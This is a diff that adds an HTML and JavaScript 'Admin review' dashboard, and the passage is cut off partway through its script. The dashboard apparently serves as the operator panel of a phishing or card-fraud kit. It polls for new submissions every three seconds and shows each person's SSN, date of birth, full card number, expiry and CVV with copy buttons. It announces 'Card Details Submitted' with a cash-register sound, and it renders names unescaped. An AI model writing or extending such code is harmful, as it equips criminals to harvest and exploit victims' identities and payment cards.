@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Admin review</title>
+<style>
+ 
+/* =========================================
+   ADMIN REVIEW DASHBOARD
+========================================= */
+
+:root {
+  --primary: #3157d5;
+  --primary-dark: #2445b5;
+  --primary-light: #edf2ff;
+  --success: #16845b;
+  --success-bg: #e8f7ef;
+  --danger: #d64545;
+  --danger-bg: #fff0f0;
+  --warning: #a66b12;
+  --warning-bg: #fff6df;
+  --background: #f4f6fb;
+  --surface: #ffffff;
+  --surface-hover: #f8faff;
+  --text-primary: #172033;
+  --text-secondary: #647087;
+  --text-muted: #929bad;
+  --border: #e5e9f1;
+  --border-dark: #d8deea;
+  --radius-sm: 7px;
+  --radius-md: 12px;
+  --radius-lg: 17px;
+  --shadow-sm: 0 2px 8px rgba(20, 35, 70, 0.04);
+  --shadow-md: 0 8px 25px rgba(20, 35, 70, 0.07);
+  --shadow-lg: 0 18px 50px rgba(20, 35, 70, 0.10);
+  --transition: all 0.22s ease;
+}
+
+body.dark-mode {
+  --background: #0f172a;
+  --surface: #1e293b;
+  --surface-hover: #334155;
+  --text-primary: #f8fafc;
+  --text-secondary: #cbd5e1;
+  --text-muted: #94a3b8;
+  --border: #334155;
+  --border-dark: #475569;
+  --primary-light: #1e3a8a;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  max-width: 1440px;
+  min-height: 100vh;
+  margin: 0 auto;
+  padding: 42px 35px;
+  background: var(--background);
+  color: var(--text-primary);
+  font-size: 14px;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  transition: background 0.3s, color 0.3s;
+}
+
+h3 {
+  color: var(--text-primary);
+  font-size: 23px;
+  font-weight: 750;
+  letter-spacing: -0.7px;
+  line-height: 1.3;
+  margin-bottom: 22px;
+}
+
+h3 .muted {
+  margin-left: 8px;
+  font-weight: 500;
+}
+
+#login {
+  width: 100%;
+  max-width: 420px;
+  margin: 100px auto;
+  padding: 38px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-lg);
+}
+
+#login h3 {
+  font-size: 25px;
+  margin-bottom: 28px;
+  text-align: center;
+}
+
+#login input {
+  display: block;
+  width: 100%;
+  height: 49px;
+  padding: 0 15px;
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text-primary);
+  background: var(--background);
+  border: 1px solid var(--border-dark);
+  border-radius: var(--radius-sm);
+  outline: none;
+  transition: var(--transition);
+}
+
+#login input::placeholder { color: var(--text-muted); }
+#login input:hover { border-color: var(--primary); }
+#login input:focus {
+  background: var(--surface);
+  border-color: var(--primary);
+  box-shadow: 0 0 0 4px rgba(49, 87, 213, 0.10);
+}
+
+#login button {
+  width: 100%;
+  height: 48px;
+  margin-top: 18px;
+  border: none;
+  border-radius: var(--radius-sm);
+  background: var(--primary);
+  color: #fff;
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 650;
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+#login button:hover {
+  background: var(--primary-dark);
+  box-shadow: 0 6px 16px rgba(49, 87, 213, 0.22);
+  transform: translateY(-1px);
+}
+
+#login button:active { transform: translateY(0); }
+
+#msg {
+  min-height: 20px;
+  margin-top: 14px;
+  color: var(--danger);
+  font-size: 13px;
+  font-weight: 550;
+  text-align: center;
+}
+
+#panel {
+  display: none;
+  width: 100%;
+  padding: 30px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-md);
+  overflow: hidden;
+}
+
+#panel h3 {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding-bottom: 20px;
+  margin-bottom: 23px;
+  border-bottom: 1px solid var(--border);
+}
+
+.toolbar {
+  display: flex;
+  align-items: center;
+  gap: 11px;
+  margin-bottom: 22px;
+}
+
+.toolbar button {
+  min-height: 39px;
+  padding: 0 17px;
+  border: 1px solid var(--border-dark);
+  border-radius: var(--radius-sm);
+  background: var(--surface);
+  color: var(--text-primary);
+  font-family: inherit;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+.toolbar button:hover {
+  background: var(--primary-light);
+  border-color: #bdcbfa;
+  color: var(--primary);
+}
+
+#refresh {
+  background: var(--primary);
+  border-color: var(--primary);
+  color: #fff;
+}
+
+#refresh:hover {
+  background: var(--primary-dark);
+  border-color: var(--primary-dark);
+  color: #fff;
+}
+
+#logout {
+  margin-left: auto;
+  color: var(--danger);
+  border-color: #f0caca;
+}
+
+#logout:hover {
+  background: var(--danger-bg);
+  border-color: var(--danger);
+}
+
+#theme-toggle {
+  padding: 0 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+#panel table {
+  width: 100%;
+  min-width: auto;
+  border-collapse: separate;
+  border-spacing: 0;
+  font-size: 13px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  overflow: hidden;
+}
+
+#panel thead { background: var(--background); }
+
+#panel th {
+  padding: 15px 13px;
+  background: var(--background);
+  color: var(--text-secondary);
+  border-bottom: 1px solid var(--border);
+  font-size: 11px;
+  font-weight: 750;
+  letter-spacing: 0.55px;
+  text-transform: uppercase;
+  text-align: left;
+  white-space: nowrap;
+}
+
+#panel td {
+  padding: 15px 13px;
+  color: var(--text-secondary);
+  border-bottom: 1px solid var(--border);
+  font-size: 13px;
+  vertical-align: middle;
+  transition: background 0.18s ease;
+}
+
+#panel tbody tr:last-child td { border-bottom: none; }
+#panel tbody tr:hover td { background: var(--surface-hover); }
+#panel tbody tr { transition: var(--transition); }
+
+.st {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-width: 76px;
+  padding: 5px 11px;
+  border-radius: 30px;
+  background: var(--background);
+  color: var(--text-secondary);
+  font-size: 10px;
+  font-weight: 750;
+  letter-spacing: 0.4px;
+  text-transform: capitalize;
+}
+
+.st.pending { background: var(--warning-bg); color: var(--warning); }
+.st.draft { background: var(--primary-light); color: var(--primary); }
+.st.approved { background: var(--success-bg); color: var(--success); }
+.st.rejected { background: var(--danger-bg); color: var(--danger); }
+
+button.act {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 32px;
+  padding: 0 12px;
+  background: var(--surface);
+  border: 1px solid var(--border-dark);
+  border-radius: 6px;
+  color: var(--text-secondary);
+  font-family: inherit;
+  font-size: 11px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+button.act:hover { background: var(--background); border-color: var(--border-dark); }
+
+button.act.approve { background: var(--success-bg); border-color: var(--success); color: var(--success); }
+button.act.approve:hover { background: var(--success); color: #fff; }
+
+button.act.reject { background: var(--danger-bg); border-color: var(--danger); color: var(--danger); }
+button.act.reject:hover { background: var(--danger); color: #fff; }
+
+button.act.delete { background: var(--background); border-color: var(--border-dark); color: var(--text-secondary); }
+button.act.delete:hover { background: var(--danger-bg); border-color: var(--danger); color: var(--danger); }
+
+button.act.view { background: var(--primary-light); border-color: var(--primary); color: var(--primary); }
+button.act.view:hover { background: var(--primary); color: #fff; }
+
+#deleted-view { display: none; }
+
+.deleted-list { list-style: none; display: grid; gap: 10px; }
+
+.deleted-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px;
+  background: var(--background);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  font-weight: 600;
+}
+
+.muted { color: var(--text-muted); font-size: 12px; font-weight: 500; }
+
+button:focus-visible, input:focus-visible {
+  outline: 3px solid rgba(49, 87, 213, 0.25);
+  outline-offset: 3px;
+}
+
+#panel { overflow-x: auto; }
+#panel::-webkit-scrollbar { height: 8px; }
+#panel::-webkit-scrollbar-track { background: var(--background); border-radius: 10px; }
+#panel::-webkit-scrollbar-thumb { background: var(--border-dark); border-radius: 10px; }
+#panel::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+@media (max-width: 900px) {
+  body { padding: 25px 18px; }
+  #panel { padding: 22px; }
+  #panel h3 { font-size: 21px; }
+  .toolbar { flex-wrap: wrap; }
+}
+
+@media (max-width: 600px) {
+  body { padding: 15px 10px; }
+  #login { margin: 55px auto; padding: 27px 21px; }
+  #login h3 { font-size: 22px; }
+  #panel { padding: 16px; border-radius: 11px; }
+  #panel h3 { display: block; font-size: 19px; line-height: 1.5; }
+  #panel h3 .muted { display: block; margin: 5px 0 0; }
+  .toolbar { display: flex; gap: 8px; }
+  .toolbar button { flex: 1; padding: 0 10px; font-size: 12px; }
+  #logout { margin-left: 0; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    scroll-behavior: auto !important;
+    transition-duration: 0.01ms !important;
+    animation-duration: 0.01ms !important;
+  }
+}
+
+/* MODAL STYLES */
+#modal-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(10, 15, 30, 0.6);
+  backdrop-filter: blur(5px);
+  z-index: 1000;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+#modal-overlay.active { display: flex; }
+
+.modal-content {
+  background: var(--surface);
+  width: 100%;
+  max-width: 850px;
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-lg);
+  padding: 32px;
+  position: relative;
+  max-height: 90vh;
+  overflow-y: auto;
+  animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(30px) scale(0.98); }
+  to { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.close-btn {
+  position: absolute;
+  top: 24px;
+  right: 24px;
+  background: var(--background);
+  border: 1px solid var(--border);
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  color: var(--text-muted);
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+.close-btn:hover {
+  background: var(--danger-bg);
+  border-color: var(--danger);
+  color: var(--danger);
+  transform: rotate(90deg);
+}
+
+.modal-title {
+  font-size: 22px;
+  font-weight: 750;
+  margin-bottom: 24px;
+  color: var(--text-primary);
+  letter-spacing: -0.5px;
+}
+
+.modal-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 24px;
+}
+
+@media (max-width: 768px) {
+  .modal-grid { grid-template-columns: 1fr; }
+}
+
+.info-card {
+  background: var(--background);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  padding: 24px;
+}
+
+.info-card h4 {
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-muted);
+  margin-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 12px;
+}
+
+.info-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 14px;
+  font-size: 13px;
+}
+
+.info-row span:first-child {
+  color: var(--text-secondary);
+  font-weight: 500;
+}
+
+.info-row span:last-child {
+  color: var(--text-primary);
+  font-weight: 650;
+  font-family: monospace;
+  font-size: 13px;
+}
+
+/* DARK THEME COPY BUTTON */
+.copy-btn-dark {
+  background: #222;
+  border: 1px solid #333;
+  color: #fff;
+  border-radius: 6px;
+  padding: 0 15px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: 0.2s;
+}
+.copy-btn-dark:hover { background: #333; }
+.copy-btn-dark:active { transform: scale(0.95); }
+</style>
+</head>
+<body>
+
+<div id="login">
+  <h3>Admin login</h3>
+  <input id="pw" type="password" placeholder="password">
+  <button id="loginBtn">Log in</button>
+  <div id="msg"></div>
+</div>
+
+<div id="panel">
+  <h3>
+    <span id="view-title">Review queue <span class="muted" id="count"></span></span>
+  </h3>
+  
+  <div class="toolbar">
+    <button id="refresh">Refresh</button>
+    <button id="toggle-view">View Deleted Users</button>
+    <button id="theme-toggle" title="Toggle Dark Mode">
+      <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 11a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0 1a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/></svg>
+    </button>
+    <button id="logout">Log out</button>
+  </div>
+
+  <div id="main-view">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Time</th>
+          <th>Status</th>
+          <th>Full Name</th>
+          <th style="text-align: right;">Actions</th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+  </div>
+
+  <div id="deleted-view">
+    <ul class="deleted-list" id="deleted-list"></ul>
+  </div>
+</div>
+
+<!-- THE MODAL -->
+<div id="modal-overlay">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeModal()">&times;</button>
+    <h2 class="modal-title">User Details</h2>
+    
+    <div class="modal-grid">
+      <!-- Personal Info -->
+      <div class="info-card">
+        <h4>Personal Information</h4>
+        <div class="info-row"><span>Full Name</span><span id="m-name">-</span></div>
+        <div class="info-row"><span>Email</span><span id="m-email">-</span></div>
+        <div class="info-row"><span>ID / SSN</span><span id="m-id">-</span></div>
+        <div class="info-row"><span>Date of Birth</span><span id="m-dob">-</span></div>
+        <div class="info-row"><span>Phone</span><span id="m-phone">-</span></div>
+        <div class="info-row"><span>Country</span><span id="m-country">-</span></div>
+        <div class="info-row"><span>Zip Code</span><span id="m-zip">-</span></div>
+      </div>
+
+      <!-- Payment Info -->
+      <div class="info-card" style="background: #111; border-color: #333;">
+        <h4 style="color: #999; border-bottom-color: #333;">Payment Information</h4>
+        
+        <!-- Name on Card -->
+        <div style="margin-bottom: 20px;">
+          <label style="color: #ccc; font-size: 13px; margin-bottom: 8px; display: block;">Name on card</label>
+          <div style="display: flex; gap: 10px;">
+            <input type="text" id="m-cardholder" readonly style="flex: 1; background: #fff; color: #000; border: 2px solid #fff; border-radius: 6px; padding: 12px 15px; font-size: 15px; font-weight: 600; outline: none; box-shadow: 0 0 0 4px rgba(255,255,255,0.1);">
+            <button class="copy-btn-dark" onclick="copyText('m-cardholder')">
+              <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> Copy
+            </button>
+          </div>
+        </div>
+
+        <!-- Card Number -->
+        <div style="margin-bottom: 20px;">
+          <label style="color: #ccc; font-size: 13px; margin-bottom: 8px; display: block;">Card number</label>
+          <div style="display: flex; gap: 10px;">
+            <input type="text" id="m-card" readonly style="flex: 1; background: #fff; color: #000; border: 2px solid #fff; border-radius: 6px; padding: 12px 15px; font-size: 15px; font-weight: 600; font-family: monospace; outline: none; box-shadow: 0 0 0 4px rgba(255,255,255,0.1);">
+            <button class="copy-btn-dark" onclick="copyText('m-card')">
+              <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> Copy
+            </button>
+          </div>
+        </div>
+
+        <!-- Expiry and CVV -->
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+          <div>
+            <label style="color: #ccc; font-size: 13px; margin-bottom: 8px; display: block;">Expiry (mm/yy)</label>
+            <div style="display: flex; gap: 10px;">
+              <input type="text" id="m-expiry" readonly style="flex: 1; width: 100%; background: #fff; color: #000; border: 2px solid #fff; border-radius: 6px; padding: 12px 15px; font-size: 15px; font-weight: 600; outline: none; box-shadow: 0 0 0 4px rgba(255,255,255,0.1);">
+              <button class="copy-btn-dark" onclick="copyText('m-expiry')" style="padding: 0 12px;">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg> Copy
+              </button>
+            </div>
+          </div>
+          <div>
+            <label style="color: #ccc; font-size: 13px; margin-bottom: 8px; display: block;">CVV</label>
+            <div style="display: flex; gap: 10px;">
+              <input type="text" id="m-cvv" readonly style="flex: 1; width: 100%; background: #fff; color: #000; border: 2px solid #fff; border-radius: 6px; padding: 12px 15px; font-size: 15px; font-weight: 600; outline: none; box-shadow: 0 0 0 4px rgba(255,255,255,0.1);">
+              <button class="copy-btn-dark" onclick="copyText('m-cvv')" style="padding: 0 12px;">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card Type Info -->
+        <div style="margin-top: 25px; display: flex; justify-content: space-between; align-items: center; background: #222; padding: 15px; border-radius: 6px; border: 1px solid #333;">
+          <span style="color: #999; font-size: 13px; font-weight: 600; text-transform: uppercase;">Card Network</span>
+          <span id="m-brand" style="color: #fff; font-size: 16px; font-weight: 800; letter-spacing: 1px;">UNKNOWN</span>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+let isMainView = true;
+let currentRows = [];
+
+// --- NOTIFICATION & SOUND ENGINE ---
+let lastKnownIds = [];
+
+const audioStep1 = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3'); // Deep chime
+audioStep1.volume = 0.5; // Keep Step 1 at a normal level
+
+const audioStep2 = new Audio('https://assets.mixkit.co/active_storage/sfx/951/951-preview.mp3'); // Loud cash register / alert
+audioStep2.volume = 1.0; // Max volume for Step 2
+// Request notification permission on login
+function requestPermissions() {
+  if (!("Notification" in window)) return;
+  if (Notification.permission === "default") {
+    Notification.requestPermission();
+  }
+}
+
+// --- Dark Mode ---
+if (localStorage.getItem('theme') === 'dark') document.body.classList.add('dark-mode');
+$('theme-toggle').onclick = () => {
+  document.body.classList.toggle('dark-mode');
+  localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
+};
+
+// --- Modal Logic ---
+function openModal(userId) {
+  const s = currentRows.find(r => r.id === userId);
+  if (!s) return;
+
+  $('m-name').textContent = s.full_name || '-';
+  $('m-email').textContent = s.email || '-';
+  $('m-id').textContent = s.id_number || '-';
+  $('m-dob').textContent = s.dob || '-';
+  $('m-phone').textContent = s.phone || '-';
+  $('m-country').textContent = s.country || '-';
+  $('m-zip').textContent = s.zip || '-';
+
+  $('m-brand').textContent = s.card_brand || 'Unknown';
+  const formattedCard = s.card_number ? s.card_number.replace(/(.{4})/g, '$1 ').trim() : '';
+  
+  document.getElementById('m-cardholder').value = s.full_name ? s.full_name.toUpperCase() : '';
+  document.getElementById('m-card').value = formattedCard;
+  document.getElementById('m-expiry').value = s.expiry || '';
+  document.getElementById('m-cvv').value = s.cvv || '';
+
+  $('modal-overlay').classList.add('active');
+}
+
+function closeModal() {
+  $('modal-overlay').classList.remove('active');
+}
+
+$('modal-overlay').addEventListener('click', (e) => {
+  if (e.target === $('modal-overlay')) closeModal();
+});
+
+function copyText(elementId) {
+  const el = document.getElementById(elementId);
+  if (!el) return;
+  navigator.clipboard.writeText(el.value).then(() => {
+    const btn = el.nextElementSibling;
+    const originalHTML = btn.innerHTML;
+    btn.innerHTML = '<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M12.736 3.97a.733.733 0 0 1 1.047 0c.286.289.29.756.01 1.05L7.88 12.01a.733.733 0 0 1-1.065.02L3.217 8.384a.757.757 0 0 1 0-1.06.733.733 0 0 1 1.047 0l3.052 3.093 5.4-6.425a.247.247 0 0 1 .02-.022Z"/></svg> Copied!';
+    btn.style.color = '#4ade80';
+    setTimeout(() => {
+      btn.innerHTML = originalHTML;
+      btn.style.color = '#fff';
+    }, 1500);
+  });
+}
+
+// --- Auth & Loaders ---
+async function checkAuth() {
+  try {
+    const r = await fetch('/api/admin/pending');
+    if (r.ok) {
+      requestPermissions();
+      $('login').style.display = 'none';
+      $('panel').style.display = 'block';
+      
+      // Fetch initial data silently (no sound)
+      const init = await r.json();
+      lastKnownIds = init.map(x => x.id);
+      renderTable(init);
+    }
+  } catch (e) {}
+}
+checkAuth();
+
+async function login() {
+  const r = await fetch('/api/admin/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ password: $('pw').value })
+  });
+  if (!r.ok) return $('msg').textContent = 'Wrong password';
+  
+  requestPermissions();
+  
+  $('login').style.display = 'none';
+  $('panel').style.display = 'block';
+  
+  const init = await fetch('/api/admin/pending').then(res => res.json());
+  lastKnownIds = init.map(x => x.id);
+  renderTable(init);
+}
+
+$('loginBtn').onclick = login;
+$('pw').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+$('logout').onclick = async () => {
+  await fetch('/api/admin/logout', { method: 'POST' });
+  location.reload();
+};
+
+// Refresh button reloads silently
+$('refresh').onclick = async () => {
+  if(isMainView) {
+    const r = await fetch('/api/admin/pending');
+    const rows = await r.json();
+    lastKnownIds = rows.map(x => x.id); // Update memory silently
+    renderTable(rows);
+  } else {
+    loadDeleted();
+  }
+};
+
+// View Toggle
+$('toggle-view').onclick = () => {
+  isMainView = !isMainView;
+  if (isMainView) {
+    $('view-title').innerHTML = 'Review queue <span class="muted" id="count"></span>';
+    $('main-view').style.display = 'block';
+    $('deleted-view').style.display = 'none';
+    $('toggle-view').textContent = 'View Deleted Users';
+    
+    fetch('/api/admin/pending').then(r => r.json()).then(rows => {
+       lastKnownIds = rows.map(x => x.id);
+       renderTable(rows);
+    });
+  } else {
+    $('view-title').innerHTML = 'Deleted Users';
+    $('main-view').style.display = 'none';
+    $('deleted-view').style.display = 'block';
+    $('toggle-view').textContent = 'Back to Main Queue';
+    loadDeleted();
+  }
+};
+
+// --- SILENT TABLE RENDERER ---
+function renderTable(rows) {
+  currentRows = rows;
+  if ($('count')) $('count').textContent = '(' + rows.length + ')';
+  
+  const tbody = $('rows');
+  tbody.innerHTML = '';
+
+  const sortedRows = rows.sort((a, b) => b.id - a.id);
+
+  for (const s of sortedRows) {
+    const tr = document.createElement('tr');
+
+    const idTd = document.createElement('td');
+    idTd.textContent = s.id;
+    tr.appendChild(idTd);
+
+    const timeTd = document.createElement('td');
+    const date = new Date(s.created_at);
+    timeTd.textContent = date.toLocaleString([], { 
+      month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+    });
+    timeTd.style.whiteSpace = 'nowrap';
+    tr.appendChild(timeTd);
+
+    const stTd = document.createElement('td');
+    const badge = document.createElement('span');
+    badge.className = 'st ' + s.status;
+    badge.textContent = s.status;
+    stTd.appendChild(badge);
+    tr.appendChild(stTd);
+
+    const nameTd = document.createElement('td');
+    nameTd.innerHTML = `<strong>${s.full_name || 'Unknown'}</strong>`;
+    tr.appendChild(nameTd);
+
+    const actTd = document.createElement('td');
+    actTd.style.textAlign = 'right';
+
+    const viewBtn = document.createElement('button');
+    viewBtn.className = 'act view';
+    viewBtn.textContent = 'View';
+    viewBtn.style.marginRight = '6px';
+    viewBtn.onclick = () => openModal(s.id);
+    actTd.appendChild(viewBtn);
+
+    if (s.status === 'pending') {
+      const a = document.createElement('button');
+      a.className = 'act approve';
+      a.textContent = 'Approve';
+      a.onclick = () => doAction('approve', s.id);
+      
+      const rj = document.createElement('button');
+      rj.className = 'act reject';
+      rj.textContent = 'Reject';
+      rj.style.marginLeft = '6px';
+      rj.onclick = () => doAction('reject', s.id);
+      
+      actTd.appendChild(a);
+      actTd.appendChild(rj);
+    }
+    
+    const dl = document.createElement('button');
+    dl.className = 'act delete';
+    dl.textContent = 'Delete';
+    dl.style.marginLeft = '6px';
+    dl.onclick = () => doAction('delete', s.id);
+    actTd.appendChild(dl);
+
+    tr.appendChild(actTd);
+    tbody.appendChild(tr);
+  }
+}
+
+// --- FAST POLLER (3 Seconds) ---
+async function checkForUpdates() {
+  if ($('panel').style.display === 'none' || !isMainView) return;
+
+  try {
+    const r = await fetch('/api/admin/pending');
+    if (!r.ok) return;
+    const rows = await r.json();
+    
+    const currentIds = rows.map(x => x.id);
+    const newRows = rows.filter(x => !lastKnownIds.includes(x.id));
+
+    if (newRows.length > 0) {
+      newRows.forEach(newRow => {
+        if (newRow.status === 'pending') {
+          audioStep2.play().catch(e => console.log('Audio blocked'));
+          if (Notification.permission === 'granted') {
+            new Notification('Card Details Submitted 💳', {
+              body: `${newRow.full_name} just completed the payment step.`,
+              icon: 'https://cdn-icons-png.flaticon.com/512/147/147143.png'
+            });
+          }
+        } else if (newRow.status === 'draft') {
+          audioStep1.play().catch(e => console.log('Audio blocked'));
+          if (Notification.permission === 'granted') {
+            new Notification('New User Info 👤', {
+              body: `${newRow.full_name} has entered their personal details.`,
+              icon: 'https://cdn-icons-png.flaticon.com/512/1077/1077114.png'
+            });
+          }
+        }
+      });
+      
+      lastKnownIds = currentIds;
+      renderTable(rows);
+    } else {
+        // If no new IDs, but the status of an existing ID changed (Draft -> Pending)
+        // We need to catch this so Step 2 works!
+        let statusChanged = false;
+        rows.forEach(row => {
+            const oldRow = currentRows.find(r => r.id === row.id);
+            if (oldRow && oldRow.status !== row.status) {
+                statusChanged = true;
+                if (row.status === 'pending') {
+                     audioStep2.play().catch(e => console.log('Audio blocked'));
+                     if (Notification.permission === 'granted') {
+                        new Notification('Card Details Submitted 💳', {
+                          body: `${row.full_name} just completed the payment step.`,
+                          icon: 'https://cdn-icons-png.flaticon.com/512/147/147143.png'
+                        });
+                     }
+                }
+            }
+        });
+        
+        if (statusChanged) {
+            renderTable(rows);
+        }
+    }
+  } catch (e) {}
+}
+
+// Run the fast checker every 3 seconds
+setInterval(checkForUpdates, 3000);
+
+async function loadDeleted() {
+  const r = await fetch('/api/admin/deleted');
+  const rows = await r.json();
+  const list = $('deleted-list');
+  list.innerHTML = '';
+
+  if (rows.length === 0) {
+    list.innerHTML = '<p class="muted">No deleted users found.</p>';
+    return;
+  }
+
+  for (const s of rows) {
+    const li = document.createElement('li');
+    li.className = 'deleted-item';
+    li.innerHTML = `<span>#${s.id} - ${s.full_name || 'Unknown'}</span>`;
+    
+    const btnContainer = document.createElement('div');
+    
+    const undoBtn = document.createElement('button');
+    undoBtn.className = 'act approve';
+    undoBtn.textContent = 'Undo Delete';
+    undoBtn.style.marginRight = '8px';
+    undoBtn.onclick = async () => {
